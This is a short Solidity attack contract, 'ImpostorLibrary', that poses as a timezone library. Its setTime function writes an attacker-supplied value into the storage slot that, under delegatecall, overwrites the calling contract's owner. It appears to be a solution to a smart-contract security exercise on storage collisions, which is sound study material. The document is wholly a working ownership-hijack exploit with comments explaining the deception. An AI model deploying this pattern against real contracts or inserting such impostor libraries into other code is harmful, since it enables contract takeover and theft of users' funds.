pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

/**
 * This pretends to be a timezone library, but actually it will overwrite the owner in the memory 
 * of the contract that calls it. 
 */
contract ImpostorLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    uint public owner; 
    
    /**
     * Purports to the storedTime state variable, but actually sets the owner. 
     * @param _time purportedly a timestamp; actually an owner address
     */
    function setTime(uint _time) public {
        owner = _time;
    }
}